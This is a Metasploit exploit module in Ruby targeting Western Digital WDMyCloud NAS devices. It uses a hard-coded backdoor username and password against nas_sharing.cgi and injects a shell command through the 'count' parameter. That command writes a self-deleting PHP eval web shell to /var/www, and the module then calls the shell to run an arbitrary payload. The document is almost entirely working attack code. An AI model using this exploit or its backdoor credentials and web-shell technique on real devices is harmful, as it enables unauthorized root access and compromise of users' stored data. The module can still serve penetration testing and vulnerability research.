# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "Western Digital WDMyCloud &#039;mydlinkBRionyg&#039; Backdoor",
      &#039;Description&#039;    => %q{
        This module exploits two issues. The first issue is that there is a hard 
        coded backdoor within WDMyCloud devices. Using this backdoor access we 
        can then reach buggy code which is vulnerable to command injection. A
        root shell will be spawned upon successful exploitation.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;James Bercegay&#039;, # Vulnerability Discovery
        ],
      &#039;References&#039;     =>
        [
          [ &#039;URL&#039;, &#039;https://gulftech.org/&#039; ]
        ],
      &#039;Privileged&#039;     => false,
      &#039;Payload&#039;        =>
        {
          &#039;DisableNops&#039; => true
        },
      &#039;Platform&#039;       => [&#039;php&#039;],
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Targets&#039;        => [ [&#039;Automatic&#039;, {}] ],
      &#039;DisclosureDate&#039; => &#039;2018-01-03&#039;,
      &#039;DefaultTarget&#039;  => 0))
  end

  def check
      
      # system file and checking if the response code is 200.
      res = send_request_cgi({
        &#039;method&#039;   => &#039;POST&#039;,
        &#039;uri&#039;      => "/cgi-bin/nas_sharing.cgi",
        &#039;vars_post&#039; => {
          &#039;cmd&#039; => 7,
          &#039;user&#039; => "mydlinkBRionyg",
          &#039;passwd&#039; => Rex::Text.encode_base64("abc12345cba"),
          &#039;path&#039; => Rex::Text.encode_base64("/mnt/HD_a4/.!@#")
        }
      })

    if res and res.code == 200
      return Exploit::CheckCode::Vulnerable
    else
      return Exploit::CheckCode::Safe
    end
  end

  def exploit

    # Make things a bit less obvious ...
    rnd = Rex::Text.rand_text_hex(rand(10) + 5)
    idx = rand(1000)

    print_status("Creating payload wrapper #{rnd}.php")

      res = send_request_cgi({
        &#039;method&#039;   => &#039;POST&#039;,
        &#039;uri&#039;      => "/cgi-bin/nas_sharing.cgi",
        &#039;vars_post&#039; => {
          &#039;cmd&#039; => 51,
          &#039;user&#039; => "mydlinkBRionyg",
          &#039;passwd&#039; => Rex::Text.encode_base64("abc12345cba"),
          &#039;start&#039; => "1",
          &#039;count&#039; => "1;echo &#039;<?php unlink(__FILE__);@eval($_REQUEST[#{idx}]);&#039;>/var/www/#{rnd}.php;echo 1"
        }
      })

    # We know the system supports PHP by default, so we go with a PHP payload
    print_status("Executing the selected payload via $_POST[#{idx}]")

      res = send_request_cgi({
        &#039;method&#039;   => &#039;POST&#039;,
        &#039;uri&#039;      => "/#{rnd}.php",
        &#039;vars_post&#039; => {
          idx => payload.encoded
        }
      })
    
    end
end

